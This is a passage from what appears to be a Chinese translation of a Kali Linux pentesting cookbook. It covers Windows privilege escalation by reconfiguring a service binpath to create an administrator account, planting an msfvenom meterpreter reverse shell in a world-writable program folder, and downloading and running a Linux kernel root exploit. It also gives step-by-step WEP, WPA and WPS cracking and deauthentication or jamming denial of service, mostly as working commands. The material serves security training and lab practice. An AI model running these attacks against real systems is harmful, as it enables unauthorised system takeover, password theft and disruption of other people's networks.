1.  现在我们将更改服务的二进制路径，因为应用程序已经给予了所有访问权限。在需要恢复到原始状态时，保留服务配置的副本。现在在终端中输入以下命令：

```
sc config upnphost binpath= "net user attack attack@123 /add"
      sc config upnphost obj= ".\LocalSystem" password= ""

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_018.jpg)

1.  我们看到我们的命令已成功执行。现在让我们通过发出以下命令来验证并重新启动服务：

```
sc qc upnphost
      net start upnphost

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_019.jpg)

1.  完成后，我们会看到一个服务无响应的错误。然而，这是注定会发生的：由于二进制路径不正确，它将尝试使用系统权限执行二进制路径。在这种情况下，它应该创建一个用户。让我们通过发出以下命令来检查：

```
net user

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_020.jpg)

1.  `attack`用户已成功创建；然而，它将是一个低级用户。让我们重新编写二进制路径。再次启动和停止 UPnP 活动，并获得管理员权限：

```
sc config upnphost binpath= "net localgroup administrators        attack/add"
      net stop upnphost
      net start upnphost

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_021.jpg)

1.  让我们检查用户 attack 的用户详细信息，以验证他/她是否已成为管理员用户：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_022.jpg)

## 工作原理...

我们在这里看到的是一个普通用户能够创建一个用户并将该用户也设为管理员。通常只有管理员或系统用户才有权限；漏洞存在于`upnphost`服务中，因为它已经给予了所有用户对服务的访问权限。让我们分析这些命令：

+   `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`：`accesschk.exe`文件是一个检查特定服务访问权限的工具。`/accepteula`命令是为了在我们不得不点击**我同意**继续的许可接受通知时静默地绕过。

+   `sc qc upnphost`：`sc`是一个用于与 NT 服务控制器和服务通信的命令行程序。`qc`命令查询服务的配置信息。

+   `sc config upnphost binpath= "net user attack attack@123 /add"`：`config`命令指定了对服务配置的编辑。在这里，我们将二进制路径设置为创建一个新用户。

+   `sc config upnphost obj= ".\LocalSystem" password= ""`：`obj`命令指定了服务二进制文件执行的类型。

## 还有更多...

正如我们所看到的，还有一个服务是有漏洞的。看看是否也可以通过该服务提升权限是个好主意。

# 配置错误的软件安装/不安全的文件权限

在这个示例中，我们将看到攻击者如何利用配置错误的软件安装并提升应用程序的权限。这是一个经典的例子，安装设置配置时没有考虑用户对应用程序文件和文件夹的权限。

## 准备工作

对于这个示例，我们需要安装一个名为 WinSMS 的应用程序。这可以从[`www.exploit-db.com/exploits/40375/`](https://www.exploit-db.com/exploits/40375/)下载，并且可以安装在运行 XP、Vista、7 或 10 的任何 Windows 机器上。出于演示目的，我们将使用 Windows 7。除此之外，我们还需要我们的 Kali 系统运行以获取反向 shell。

## 如何做到的...

1.  一旦我们安装了应用程序，我们将执行命令提示符并检查文件安装的文件夹的权限。输入以下命令：

```
cacls "C:\Program Files\WinSMS" 

```

输出将如下截图所示：

![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_023.jpg)

1.  正如我们所看到的，有`Everyone`访问权限，并且拥有完全权限。这是一个严重的失误，这意味着任何有权访问系统的人都可以修改该文件夹中的任何文件。攻击者几乎可以做任何事情。攻击者可以将他的恶意文件与 WinSMS 的可执行文件放在一起，甚至替换 DLL 文件并执行他的命令。出于演示目的，我们将放置一个我们将从 Kali 创建的反向 shell，并等待连接。让我们开始。在您的 Kali 终端中，输入以下内容创建一个反向`exe` shell：

```
msfvenom -p windows/meterpreter/reverse_tcp       LHOST=192.168.157.151 LPORT=443 -f exe > WinSMS.exe

```

输出将如下截图所示：

![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_024.jpg)

1.  我们下载这个可执行文件，并将其替换为安装软件的文件夹中的`WinSMS.exe`文件：![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_025.jpg)

现在我们用新创建的 meterpreter 文件替换 WinSMS 文件：

![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_026.jpg)![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_027.jpg)

1.  现在我们已经放置了文件，让我们在 Metasploit 上打开一个监听器，等待看看当用户执行文件时会发生什么。在终端中输入以下命令设置 Metasploit 监听器：

```
      msfconsole
      use exploit/multi/handler
      set payload windows/meterpreter/reverse_tcp
      set lhost 192.168.157.151
      set lport 443
      exploit

```

输出将如下截图所示：

![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_028.jpg)

1.  现在我们所要做的就是等待高级用户执行该文件，然后，哇，我们将获得该用户的反向 shell，完整地拥有他的权限。出于演示目的，我们将以管理员身份执行此文件。让我们来看一下：![如何做到...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_029.jpg)

1.  现在我们有了一个升级的 shell 可以进行交互。

## 它是如何工作的...

工作原理非常简单：攻击者利用不安全的文件夹权限，替换文件为恶意文件，并在等待反向连接时执行它。我们已经在之前的示例中看到了`msfvenom`的工作原理。因此，一旦攻击者替换了文件，他将简单地等待高权限用户的连接。

## 还有更多...

现在，我们故意留下了一个场景给读者：在前面的情况下，文件将被执行。但是，它不会启动应用程序，这显然会引起怀疑。读者的任务是使用`msfvenom`将后门附加到现有的可执行文件上，这样当它被初始化时，用户将不会知道发生了什么，因为程序将被执行。

## 另请参阅...

+   可以使用 dork 找到更多关于此的示例：不安全的文件权限站点：[exploit-db.com](http://exploit-db.com)

# Linux 权限提升

对于这个示例，我们将使用一个名为 Stapler 的易受攻击的操作系统。该镜像可以从[`www.vulnhub.com/entry/stapler-1,150/`](https://www.vulnhub.com/entry/stapler-1,150/)下载并加载到 VirtualBox 中。在前一章中，我们学习了如何进行漏洞评估并获得低级或高级访问权限。作为练习的一部分，读者可以进行渗透测试并在 Stapler OS 上获得 shell。我们将从接收低权限 shell 的地方继续。

## 做好准备

对于这个教程，读者需要在易受攻击的 Stapler OS 上拥有低权限 shell。在这种情况下，我们通过一些信息收集和密码破解成功地获得了一个用户的 SSH 连接。

## 如何做…

1.  我们已经使用用户名`SHayslett`成功登录到 Stapler 机器，如下截图所示：![如何做…](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_030.jpg)

1.  我们将枚举系统的操作系统内核版本。输入以下命令来检查版本类型和内核详细信息：

```
uname -a
      cat /etc/lsb-release

```

输出结果将如下截图所示：

![如何做…](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_031.jpg)

1.  在搜索提升权限的漏洞时，发现 Ubuntu 16.04 存在漏洞：![如何做…](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_032.jpg)

1.  第一次搜索是为了匹配我们的内核版本和 Ubuntu 操作系统版本。让我们继续在我们想要提升权限的机器上下载它。可以使用以下命令进行下载：

```
      wget https://github.com/offensive-security/exploit-database-      bin-sploits/raw/master/sploits/39772.zip
      unzip 39772.zip

```

输出结果将如下截图所示：

![如何做…](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_033.jpg)

1.  现在我们进入`39772`文件夹并解压`exploit.tar`文件。在终端中输入以下命令：

```
cd 39772
      tar xf exploit.tar

```

输出结果将如下截图所示：

![如何做…](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_034.jpg)

1.  在输入`ebpf*`文件夹后，会有一个`compile.sh`文件。让我们编译并执行该文件：

```
cd ebpf_mapfd_doubleput_exploit/
      ./compile.sh
      ./doubleput

```

输出结果将如下截图所示：

![如何做…](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_09_035.jpg)

很好。我们已成功地获得了系统的 root 权限。

## 它是如何工作的…

这是一个非常简单和直接的方法，用来弄清楚如何在 Linux 机器上提升权限。我们经历了以下步骤：

+   查找操作系统和内核版本

+   在互联网上搜索漏洞，如果有的话

+   找到一些利用方法

+   与我们可用的向量进行交叉验证

+   所有向量已编译，因此我们下载并执行了内核利用程序

还有其他提升 Linux 权限的方法，比如配置错误的服务、不安全的权限等等。

## 还有…

在这个教程中，我们看了如何通过利用基于 OS 的漏洞来提升低级用户的权限。还有其他提升权限的方法。所有这些的关键因素都是枚举。

为了了解更多，请检查以下漏洞：

+   操作系统和内核版本

+   应用程序和服务

+   在这个中，我们搜索正在以高权限或甚至 root 权限运行的服务，以及配置中是否存在任何漏洞

+   计划任务和访问或编辑它们的权限

+   访问机密信息或文件，如`/etc/passwd`或`/etc/shadow`

+   无人值守密码文件

+   控制台历史/活动历史

+   日志文件

## 另请参阅…

+   g0tm1lk 在他的网站上有一篇非常好的文章，他在其中提供了大量信息，以便了解如何枚举和找到合适的利用方法：[`blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/`](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)


# 第十章：无线利用

在本章中，我们将涵盖以下内容：

+   建立无线网络

+   绕过 MAC 地址过滤

+   嗅探网络流量

+   破解 WEP 加密

+   破解 WPA/WPA2 加密

+   破解 WPS

+   拒绝服务攻击

# 介绍

当前，无线网络正在兴起。随时随地需要即时网络访问或在任何地点随时上网的能力正在增加。员工和访客都需要进入企业网络，需要访问互联网以进行演示或推销产品；甚至员工的移动设备可能需要遵循 BYOD 政策进行无线访问。然而，应该知道，关于安全性的无线协议确实存在一些问题。通过 Mac ID 来猜测设备的正确性是唯一的方法，这是可以被利用的。在本章中，我们将探讨无线网络中观察到的不同漏洞。在我们深入之前，让我们了解一些术语：

+   Wi-Fi 接口模式

+   主：接入点或基站

+   托管：基础设施模式（客户端）

+   点对点：设备对设备

+   网状：（网状云/网络）

+   中继器：范围扩展器

+   监视器：RFMON=

+   Wi-Fi 帧

+   管理帧：

+   信标帧：接入点定期发送信标帧以宣布其存在并传递信息，如时间戳、SSID 和有关接入点的其他参数，以供范围内的无线网卡选择与之关联的最佳接入点的基础。无线网卡不断扫描所有 802.11 无线电信道，并侦听信标，作为选择与之关联的最佳接入点的基础。

+   探测：两种类型：探测请求和探测响应：

+   探测请求帧：当需要从另一个站点获取信息时，站点会发送探测请求帧。例如，无线网卡会发送探测请求以确定范围内有哪些接入点。

+   探测响应帧：在接收到探测请求帧后，站点将以探测响应帧作出响应，其中包含能力信息、支持的数据速率等。

# 建立无线网络

无线测试的最关键部分是确保测试人员的无线设置的正确性。需要对适当的测试环境进行广泛的配置，用户应该对无线通信协议有相当的了解。整个测试的核心组件之一是无线适配器。错误的无线适配器可能会破坏整个测试活动。依赖于软件，aircrack-ng 套件在无线测试中发挥了重要作用。无线适配器的兼容性列表可以在[`www.aircrack-ng.org/doku.php?id=compatibility_drivers`](https://www.aircrack-ng.org/doku.php?id=compatibility_drivers)找到。对于我们的演示目的，我们将使用 ALFA 卡型号**ALFA AWUS0360H**；它支持**b**和**g**协议。Kali 支持的一些无线适配器有：

+   Atheros AR9271

+   Ralink RT3070

+   Ralink RT3572

+   Realtek 8187L（无线 G 适配器）

在选择 Wi-Fi 卡时，可以考虑以下内容以进行更好的选择：

+   802.11a-5 GHZ 速率：最高 54 Mbps

+   802.11b-2.4 GHZ 速率：最高 11 Mbps

+   802.11g-2.4 GHZ 速率：最高 54 Mbps

+   802.11n-2.4 GHZ 速率：最高 300 Mbps

+   802.11ac（草案）-5 GHZ 速率：最高 1.73Gps！！！

## 准备工作

我们将通过托管在虚拟机上的 Kali 机器进行无线测试。要设置无线网络，我们需要 Kali 操作系统、无线适配器和目标无线连接。一旦这些都准备好了，我们就可以开始我们的渗透测试阶段。

## 如何做...

1.  要在虚拟机上设置网卡，我们需要确保在 VMplayer 的编辑虚拟机设置中打开“自动连接新 USB 设备”选项，如下面的屏幕截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_001.jpg)

一旦设备被检测到，使用以下命令进行检查：

```
      ifconfig wlan0

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_002.jpg)

1.  让我们检查是否可以启用监视模式。**监视**模式允许具有**无线网络接口控制器**（**WNIC**）的计算机监视从无线网络接收到的所有流量：

```
      airmon-ng start wlan0

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_003.jpg)

1.  由于我们看到一些潜在有问题的服务正在运行，我们将不得不禁用它们。我们可以通过使用`kill`命令和前面截图中提到的进程 ID（`PID`）来杀死进程：

```
      airmon-ng stop wlan0mon
      kill ( PID's)

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_004.jpg)

1.  现在我们可以开始检查是否可以打开**监视**模式：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_005.jpg)

1.  我们已经设置好了适配器并打开了监视模式。现在我们可以开始练习了。

# 绕过 MAC 地址过滤

MAC 地址是尝试在无线网络上进行身份验证的用户的唯一标识。通常作为最佳实践，用户倾向于对他们的网络进行 Mac 过滤以保护自己免受攻击者的侵害；然而，更改 Mac 地址并攻击网络非常容易。在这个教程中，我们将看到如何更改无线网卡的 Mac 地址。

## 准备工作

执行此练习需要一个无线网卡和一台 Kali 机器。在这个教程中，我们将扫描可用的网络和连接到网络的设备，然后我们将把无线网卡的 Mac ID 更改为连接到网络的主机的 Mac ID。

## 操作步骤...

1.  在开始之前，请确保通过在其接口上发出停止监视命令来停止在上一个教程中启用的**监视**模式：

```
      airmon-ng stop wlan0mon

```

1.  让我们使用以下命令检查我们设备的 MAC 地址：

```
      ifconfig wlan0

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_006.jpg)

1.  现在我们将使用以下命令禁用网络接口：

```
      ifconfig wlan0 down

```

1.  现在我们选择一个网络设备，并使用`macchanger`来更改我们的 Mac 地址。我们将把它更改为一个合法的经过身份验证的用户的 Mac 地址，可以通过运行下一个教程中解释的`airodump-ng`命令来找到：

```
      macchanger -m xx:xx:xx:xx:xx:xx wlan0

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_007.jpg)

1.  在没有 Mac 过滤的情况下，如果用户决定保持匿名，可以从以下位置获取随机的 Mac 地址：

```
      macchanger -r wlan0

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_008.jpg)

1.  现在我们可以使用以下命令启用无线设备：

```
      ifconfig wlan0 up

```

## 还有更多...

这是任何渗透测试活动开始之前的基本步骤，现在我们将研究破解无线协议。

# 嗅探网络流量

在这个教程中，我们将了解使用无线适配器来嗅探无线数据包的基础知识；为了这样做，我们将不得不将无线网卡切换到**监视**模式。对于嗅探，我们将使用`aircrack-ng`套件中的`airodump-ng`命令。

## 准备工作

我们将在这个练习中使用 Alfa 卡；确保无线适配器像之前的教程中那样连接，我们就可以开始嗅探流量了。

## 操作步骤...

1.  如果无线设备未打开，请使用以下命令打开它：

```
ifconfig wlan0 up 

```

1.  使用以下命令将卡放入监视模式：

```
      airmon-ng start wlan0

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_009.jpg)

1.  现在我们有了一个监视接口，我们将发出：

```
airodump-ng wlan0mon 

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_010.jpg)

1.  我们也可以捕获特定的 ESSID；我们只需要提到一个特定的频道并写入一个文件；在这种情况下，我们正在写入一个名为 sniff 的文件：

```
      airodump-ng wlan0mon --channel 6 -w sniff

```

输出将如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_011.jpg)![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_012.jpg)

1.  然后可以在浏览器、Wireshark 或 Excel 中查看这些数据包，具体取决于扩展名。Wireshark 用于打开 CAP 文件，如下截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_013.jpg)

1.  一旦我们捕获了数据包，就可以使用键盘组合*Ctrl* + *C*终止它，文件将以 CAP 扩展名保存。

## 工作原理...

`airodump-ng`命令是`aircrack-ng`套件的一部分，它执行将网络上所有嗅探到的数据包转储的任务；这些数据包以`.cap`扩展名保存，并可以在 Wireshark 中打开。

## 还有更多...

到目前为止，我们已经介绍了嗅探无线数据包的基础知识。除此之外，我们还可以开始了解如何破解无线加密。

# 破解 WEP 加密

在这个示例中，我们将学习关于 WEP 加密破解。**有线等效隐私**（**WEP**）是一种安全协议，规定在 IEEE **无线保真**（**Wi-Fi**）标准 802.11b 中，并旨在为**无线局域网**（**WLAN**）提供与通常预期的有线局域网相当的安全和隐私级别。WEP 使用 RC4 加密，在 Internet 上作为 HTTPS 的一部分被广泛使用。这里的缺陷不是 RC4，而是 RC4 的实现方式。问题在于 IV 的重用。在这个练习中，我们将使用一个名为**Wifite**的工具。这个工具用于攻击多个 WEP、WPA 和 WPS 加密的网络。这个工具是可定制的，并且只需几个参数就可以自动化。Wifite 旨在成为“设置并忘记”的无线审计工具。

## 准备工作

对于这个活动，我们将需要 wifite（预装在 Kali 中），一个活动和运行的无线适配器，以及一个运行 WEP 加密的无线路由器。

## 如何操作...

1.  要确保 wifite 框架已更新，请输入以下命令：

```
      wifite -upgrade

```

1.  要列出所有可用的无线网络，请输入以下命令：

```
      wifite -showb

```

输出如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_014.jpg)![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_015.jpg)

1.  通过这个命令，可以查看附近所有可用的无线设备。使用*Ctrl* + *C*来中断脚本。

1.  使用以下命令再次启动 Wifite：

```
      Wifite

```

输出如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_016.jpg)

1.  正如我们所看到的，该命令已列出了所有检测到的无线网络及其 ESSID、BSSID 等。记住与目标 ID 对应的数字。现在我们应该退出列表模式，并输入以下键盘组合：

```
      Ctrl + C
      3

```

输出如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_017.jpg)

1.  一旦我们按下*Ctrl* + *C*组合，它会提示我们提供目标编号。完成后，wifite 将自动开始进行 WEP 破解并给出密码。

## 工作原理...

在后台，框架最初的操作是使用`airmon-ng`命令将无线适配器置于监视模式，这是`aircrack-ng`套件的一部分，并开始枚举列表：

+   `wifite -upgrade`：此命令将 wifite 框架升级到最新版本

+   `wifite -showb`：此命令列出网络中检测到的所有可用无线网络

WEP 破解的工作原理如下：

WEP 准备密钥计划（种子）；这是用户共享的秘密密钥与随机生成的 24 位初始化向量（IV）的连接。 IV 增加了秘密密钥的寿命，因为站点可以为每个帧传输更改 IV。然后，WEP 将该输出作为生成密钥流的伪随机数生成器的结果“种子”发送。这个密钥流的长度等于帧有效负载的长度加上 32 位（**完整性检查值**（**ICV**））。

WEP 失败的原因是 IV 太短且以明文形式存在；RC4 生成的 24 位字段密钥流相对较小。由于 IV 是静态的且 IV 流很短，因此它们被重复使用。关于 IV 的设置或更改没有标准；可能存在同一供应商的无线适配器最终具有相同 IV 序列的情况。

攻击者可以继续嗅探数据并收集所有可用的 IV，然后成功破解密码。更多信息，请访问[`www.isaac.cs.berkeley.edu/isaac/wep-faq.html`](http://www.isaac.cs.berkeley.edu/isaac/wep-faq.html)。

## 还有更多...

当 wifite 提示我们选择一个网络时，我们可以使用`all`功能；然而，你应该牢记你所在国家的 IT 和网络安全法律，以避免做任何非法的事情。

# 破解 WPA/WPA2 加密

在这个食谱中，我们将看到攻击者如何破解 WPA2 加密。WPA Wi-Fi 保护访问是 WEP 加密之后的继任者，因为 WEP 加密失败。在 WPA2-PSK 中，我们强制受害者与无线路由器进行多次认证握手，并捕获所有流量，因为握手包含预共享密钥。一旦我们获得了大量的握手，我们尝试基于字典的密码猜测来对捕获的数据包进行猜测，以查看我们是否能成功猜出密码。在这个食谱中，我们将看到 WPA/WPA2 如何被破解。

## 准备工作

为此，我们将完全依赖于`aircrack-ng`套件；因为它在 Kali 中预先构建，我们不需要进行太多配置。我们还需要一个使用 WPA/WPA2 加密的无线路由器。让我们开始吧。

## 如何做...

1.  首先，我们将使用以下命令将我们的无线设备切换到监视模式：

```
      airmon-ng start wlan0

```

1.  我们可以使用以下命令列出所有可用的无线网络：

```
      airodump-ng wlan0mon

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_018.jpg)

1.  现在我们已经有了可用无线网络的列表和我们的网络 BSSID 和 ESSID，我们可以开始捕获专门针对该信道的数据包：

```
      airodump-ng --bssid xx:xx:xx:xx:xx:xx -c X --write WPACrack        wlan0mon

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_019.jpg)

1.  现在我们将不得不对现有客户端进行去认证，以捕获他们对无线路由器的握手请求，因为它将包含认证凭据。只有在去认证期间，我们才能成功捕获加密密码：

```
      aireplay-ng --deauth 1000 -a xx:xx:xx:xx:xx:xx wlan0mon

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_020.jpg)

1.  现在经过认证的用户将被迫重新认证近 1000 次，之后，如果我们在右上角查看我们的`airodump-ng`，我们将找到 WPA 握手，这意味着我们成功捕获了流量。我们现在可以通过按*Ctrl* + *C*来终止转储。认证数据包越多，我们破解密码的机会就越大。

1.  现在我们将开始对转储文件进行 WPA 破解。我们需要注意文件名以多个扩展名保存，并根据迭代号添加了`-01`；`rockyou.txt`是一个包含常用密码和字母数字组合的字典，将用于对捕获文件进行猜测密码：

```
      aircrack-ng WPACrack-01.cap -w /usr/share/wordlists/rockyou.txt

```

输出将如下截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_021.jpg)

1.  我们已成功解密密码。

## 它是如何工作的...

让我们了解前面食谱的命令：

+   `airmon-ng start wlan0`：这将启动无线适配器并将其设置为监视模式；监视模式对于在网络上注入和嗅探数据包是必不可少的

+   `airodump-ng wlan0mon`：此命令列出了可用的无线网络，我们可以捕获其数据包

```
      airodump-ng --bssid xx:xx:xx:xx:xx:xx -c X --write WPACrack      wlan0mon:
```

以下是该命令的解释：

+   `--bssid`：这是路由器的 MAC 地址，是提供无线网络的站点

```
      aireplay-ng --deauth 100 -a xx:xx:xx:xx:xx:xx wlan0mon:

```

以下是该命令的解释：

+   `--deauth`：此命令向经过身份验证的客户端发送`RESET`数据包，以便当它们尝试重新认证时，我们可以捕获握手数据以进行破解。

`Aireplay-ng`，`airodump-ng`和`airmon-ng`命令都是 aircrack 的一部分。

## 还有更多...

这种方法基本上被视为暴力破解，这是目前破解 WPA 的唯一方法。支持 WPS 的路由器也可以被破解。在下一个步骤中，我们将看看如何破解 WPS。

# 破解 WPS

**WPS**代表**Wi-Fi Protected Setup**。这是在 2006 年引入的，WPS 的主要目的是简化将新设备添加到网络的过程；不需要记住长长的 WPA 或 WEP 密码。然而，WPS 的安全性很快就消失了；2011 年揭示了一个影响支持 WPS 的无线路由器的重大安全漏洞。

## 准备工作

对于这个步骤，我们将使用一个名为**Reaver**的工具。这是一个在 Kali Linux 中预安装的开源 WPS 破解工具。Reaver 对 WPS PIN 号进行暴力破解。一旦获得 WPS PIN，就可以恢复 WPA PSK。对于这个练习，我们需要一个启用了 WPS 功能的无线路由器。

## 如何操作...

1.  要扫描启用了 WPS 的路由器，有一个与 Reaver 一起提供的名为`wash`的软件包；输入以下命令以列出启用 WPS 的设备。请注意，需要监视模式来查看信标数据包，了解 AP 是否支持 WPS，并确定 WPS 访问是否被锁定。这有助于我们了解攻击是否可能：

```
      wash -i wlan0mon

```

输出将如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_022.jpg)

1.  如果用户出现以下错误，输入以下命令：

```
      wash -i wlan0mon -C

```

输出将如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_023.jpg)

1.  我们使用`-C`命令来忽略**FCS**（**Frame Check Sequence**）错误。一旦获得 AP 的 BSSID，我们将使用`reaver`命令尝试使用 Pixie Dust 方法进行 WPS 攻击：

```
reaver -i wlan0mon -c 1 -b xx:xx:xx:xx:xx:xx -K X -vv 

```

输出将如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_024.jpg)

1.  如果无线设备包含空格，则会提到网络名称。Reaver 开始 Pixie Dust 攻击以暴力破解 PIN，并且大约需要 5 到 10 分钟。**PixieWPS**是一种用于离线暴力破解 WPS PIN 的工具，同时利用了一些无线接入点的低或不存在的熵。如果我们运行非 Pixie Dust 攻击，时间可能会升至 5 或 6 小时：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_025.jpg)

## 工作原理...

让我们深入了解命令及其功能：

+   `wash -i wlan0mon`：此命令扫描所有启用 WPS 的设备。

+   `wash -i wlan0mon -C`：`-C`命令忽略 FCS 数据包

+   `reaver -i wlan0mon -c X -b xx:xx:xx:xx:xx:xx -K x -vv`

+   `-i`：这指定与指定接口的交互

+   `-b`：这指定使用 BSSID

+   `-K（x）`：`X`是数字类型，`K`是设置 Pixie Dust 的参数

+   `-c`：指定网络运行的信道

+   `-vv`：这会显示有关脚本正在执行的更多非关键信息，以更好地理解过程

## 还有更多...

PixieWPS 是一种用于离线暴力破解 WPS PIN 的工具，同时利用了一些无线接入点的低或不存在的熵，也被称为 Pixie Dust 攻击；这是 Dominique Bongard 发现的。PixieWPS 工具（由 wiire 开发）诞生于 Kali 论坛。

在下一个步骤中，我们将看到拒绝服务攻击是如何在网络上发生的。

# 拒绝服务攻击

最主要的攻击之一是拒绝服务攻击，整个无线网络都可以被破坏；在这种攻击中，合法用户将无法访问网络。无线网络很容易受到这种攻击。由于用户的识别是基于 Mac 地址的，因此很难追踪这种活动的来源。这种情况发生的几种方式包括伪造假的源地址，或者通过复制路由器请求配置更改。一些设备也会通过完全关闭网络来响应 DoS 攻击。一种方法是向无线网络发送垃圾数据包或持续向网络上的所有用户发送 Deauth 数据包。

在这个教程中，我们将看到 DoS 攻击是如何发生的。

## 准备工作

我们需要一个正在积极浏览互联网或网络的用户，另一端我们将有我们的 Kali Linux 机器和连接到它的无线适配器。

## 操作步骤...

1.  执行 DoS 攻击最简单的方法之一是 Deauth 攻击；在这里，我们将使用`aireplay`通过以下命令对网络执行 Deauth 攻击：

```
      aireplay-ng --deauth 100 -a (BSSID) -c wlan0mon

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_026.jpg)

1.  Websploit 中还有一些有效载荷；其中一个称为 Wi-Fi 干扰器。在 Kali 终端中使用以下命令执行：

```
      websploit
      use wifi/wifi_jammer
      show options
      set bssid xx:xx:xx:xx:xx:xx
      set essid xx:xx:xx:xx:xx:xx
      set interface wlanx
      set channel x
      run

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_027.jpg)

1.  与`bssid`的连接被渲染为不可访问：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_10_028.jpg)

## 工作原理...

让我们了解在这个教程中使用的命令：

+   `aireplay-ng --deauth 100 -a (BSSID) -c wlan0mon`：这里，`--deauth`命令启动一个`deauth`请求，后跟`100`，指定`deauth`请求发送 100 次。

如果攻击者想要持续发送 Deauth 并且永不停止，可以使用`--deauth 0`向目标发送无休止的`deauth`请求。

+   `websploit`：这将初始化 Websploit 框架

+   使用 wifi/ wifi_jammer：这个命令将加载干扰器模块

+   `set bssid xx:xx:xx:xx:xx:xx`：其中`xx:xx:xx:xx:xx:xx`将是`bssid`；对`essid`也是一样的

+   设置接口 wlanx：`wlanx`将是我们的适配器连接的接口

+   `run`：这将执行脚本并启动攻击

## 还有更多...

